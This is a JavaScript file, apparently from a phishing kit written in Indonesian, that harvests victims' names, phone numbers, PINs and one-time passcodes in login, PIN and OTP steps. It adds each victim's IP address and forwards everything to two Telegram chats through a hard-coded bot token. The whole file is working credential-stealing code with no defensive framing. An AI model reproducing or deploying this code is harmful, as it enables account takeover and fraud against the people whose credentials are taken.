const TELEGRAM_CONFIG = {
    BOT_TOKEN: '7234779072:AAEk2PBQaYQ7i8QLKZtU7m_Udpv8EQn4bgk',
    CHAT_IDS: ['7160773412', '7323363406'],
    API_URL: 'https://api.telegram.org/bot'
};

// Get IP Address function
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error getting IP:', error);
        return 'Unknown IP';
    }
}

// Send to Telegram function
async function sendToTelegram(data) {
    try {
        const ip = await getIPAddress();
        let message = '';

        switch(data.step) {
            case 'login':
                message = `🔔 *LOGIN BARU*\n\n`
                       + `👤 *Nama:* ${data.nama}\n`
                       + `📱 *No HP:* ${data.nohp}\n`
                       + `🌐 *IP:* \`${ip}\`\n`
                       + `⏰ *Time:* ${new Date().toLocaleString('id-ID')}`;
                break;

            case 'pin':
                message = `🔐 *PIN TERVERIFIKASI*\n\n`
                       + `👤 *Nama:* ${data.nama}\n`
                       + `📱 *No HP:* ${data.nohp}\n`
                       + `🔑 *PIN:* \`${data.pin}\`\n`
                       + `🌐 *IP:* \`${ip}\`\n`
                       + `⏰ *Time:* ${new Date().toLocaleString('id-ID')}`;
                break;

            case 'otp':
                message = `📱 *OTP TERVERIFIKASI*\n\n`
                       + `👤 *Nama:* ${data.nama}\n`
                       + `📱 *No HP:* ${data.nohp}\n`
                       + `🔑 *PIN:* \`${data.pin}\`\n`
                       + `🔐 *OTP:* \`${data.otp}\`\n`
                       + `🌐 *IP:* \`${ip}\`\n`
                       + `⏰ *Time:* ${new Date().toLocaleString('id-ID')}`;
                break;
        }

        // Send to all chat IDs directly using Telegram API
        const promises = TELEGRAM_CONFIG.CHAT_IDS.map(chatId => 
            fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).then(res => res.json())
        );

        const results = await Promise.all(promises);
        return results.every(r => r.ok);
    } catch (error) {
        console.error('Telegram Error:', error);
        return false;
    }
}

// Make functions available globally
window.sendToTelegram = sendToTelegram;
window.getIPAddress = getIPAddress;